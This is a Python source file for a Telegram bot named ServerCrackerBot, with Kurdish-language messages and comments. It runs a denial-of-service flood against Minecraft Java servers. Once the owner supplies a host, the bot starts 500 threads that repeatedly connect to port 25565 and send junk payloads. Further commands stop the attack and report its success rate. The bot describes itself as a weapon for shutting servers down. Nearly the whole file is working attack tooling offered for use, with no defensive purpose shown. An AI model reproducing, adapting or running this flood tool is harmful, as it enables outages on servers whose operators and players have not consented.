import os
import socket
import threading
import sys
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

user_states = {}
attack_active = False
attack_stats = {"success": 0, "failed": 0}

def flood_worker(host, port):
    global attack_active, attack_stats
    # گۆڕینی دۆمەین (بۆ نموونە play.server.com) بۆ ئایپی ڕاستەقینە لە ڕێگەی DNSەوە
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host  # ئەگەر هەر ئایپی بوو خۆی بەکاریدێنێت

    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, int(port)))
            payload = b"\xfe\x01\x02\x03\x04\x05\x06\x07\x08\xff" * 200
            for _ in range(100):
                if not attack_active:
                    break
                s.send(payload)
            attack_stats["success"] += 1
        except Exception:
            attack_stats["failed"] += 1
        finally:
            try:
                s.close()
            except:
                pass

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💀 دەربارەی بۆت", callback_data="about_bot")],
        [InlineKeyboardButton("🔥 هێرش بۆ سێرڤەری Minecraft Java", callback_data="start_attack_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "about_bot":
        about_text = (
            "💀 **دەربارەی ServerCrackerBot:**\n\n"
            "ئەم بۆتە چەکێکی پیشەگەرانە و پەرەپێدراوە بۆ فڵۆدکردن و ڕاگرتنی (Shutdown) سێرڤەرە گەورەکانی ماینکرافت (Java Edition).\n"
            "توانای ناردنی ملیۆنەها پەیوەندی و پاکێتی کوشندەی هەیە.\n\n"
            "⚡️ **تەنها بۆ خاوەن `@ALONE427` کار دەکات!**"
        )
        await query.message.reply_text(about_text)

    elif query.data == "start_attack_menu":
        if user_id != OWNER_ID:
            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت! تەنها خاوەنی فەرمی دەتوانێت هێرش ئەنجام بدات.")
            return
        user_states[user_id] = "waiting_ip"
        await query.message.reply_text(
            "🎯 **ئامادەکاری بۆ هێرش:**\n\n"
            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە (بۆ نموونە):\n"
            "`abysssmp@.playwithbao.com` یان `play.server.com`"
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active, attack_stats
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        return

    if user_states.get(user_id) == "waiting_ip":
        host = update.message.text.strip()
        if not host:
            await update.message.reply_text("🔥 هەڵە! تکایە ناوی دۆمەین یان ئایپی دروست بنووسە.")
            return

        port = 25565  # پۆرتی نەگۆڕ و فەرمی جاڤا
        user_states[user_id] = None

        attack_active = True
        attack_stats = {"success": 0, "failed": 0}

        threads_count = 500
        for _ in range(threads_count):
            t = threading.Thread(target=flood_worker, args=(host, port))
            t.daemon = True
            t.start()

        await update.message.reply_text(
            f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n"
            f"🎯 ئامانج: `{host}:{port}`\n"
            f"⚡️ بارودۆخ: وەرگێڕانی دۆمەین و ناردنی ملیۆنەها پاکێت بۆ سێرڤەرەکەی ماینکرافت...\n\n"
            f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
            f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
        )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != OWNER_ID:
        return
    
    attack_active = False
    await update.message.reply_text("⏹ **هێرشەکە بە سەرکەوتوویی ڕاگیرا و مەکینە سارد کرایەوە!**")

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    success = attack_stats["success"]
    failed = attack_stats["failed"]
    total = success + failed
    
    success_rate = (success / total * 100) if total > 0 else 0
    
    status_text = (
        "📊 **پشکنینی ڕەوشی هێرش (Server Status):**\n\n"
        f"✅ هێرش و پەیوەندییە سەرکەوتووەکان: `{success}`\n"
        f"❌ هێرشە سەرنەکەوتووەکان (پچڕاو/ڕەتکراوە): `{failed}`\n"
        f"📈 ڕێژەی سەرکەوتنی هێرشەکە: `{success_rate:.2f}%`\n"
        f"⚡️ دۆخی هێرش: {'🔴 لە کاردایە (Active)' if attack_active else '⚪️ وەستاوە'}"
    )
    await update.message.reply_text(status_text)

def main():
    if not TOKEN or not OWNER_ID:
        print("❌ هەڵە: توکن یان ئایدی خاوەن نەدۆزراوەتەوە لە Secrets!")
        sys.exit(1)
        
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("💀 بۆتی ServerCrackerBot بە سەرکەوتوویی کەوتە کار...")
    app.run_polling()

if __name__ == "__main__":
    main()
